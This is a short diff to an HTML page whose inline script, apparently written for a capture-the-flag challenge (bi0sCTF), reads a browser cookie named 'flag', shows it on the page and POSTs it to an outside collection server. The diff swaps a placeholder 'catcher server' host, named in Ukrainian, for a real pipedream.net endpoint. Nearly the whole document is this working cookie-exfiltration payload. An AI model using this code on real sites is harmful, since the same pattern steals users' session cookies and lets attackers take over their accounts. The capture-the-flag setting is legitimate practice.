@@ -10,8 +10,8 @@
 
   <script>
     function getCookie(name) {
-      const value = ; ${document.cookie};
-      const parts = value.split(; ${name}=);
+      const value = `; ${document.cookie}`;
+      const parts = value.split(`; ${name}=`);
       if (parts.length === 2) return parts.pop().split(';').shift();
       return null;
     }
@@ -19,17 +19,18 @@
     const flag = getCookie('flag');
     const display = document.getElementById('flag-value');
     if (flag) {
-      display.innerText = flag = ${flag};
+      display.innerText = `flag = ${flag}`;
 
       // Відправляємо кукі на ловильний сервер
-      fetch('http://ТВОЙ_ЛОВИЛЬНИЙ_СЕРВЕР/steal', {
+      fetch('https://eomp5b5q7qo9g0s.m.pipedream.net', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ flag })
+        body: JSON.stringify({ flag: `bi0sCTF{${flag}}` })
+
       });
     } else {
       display.innerText = 'Кукі "flag" не знайдено';
     }
   </script>
 </body>
-</html> 
+</html>
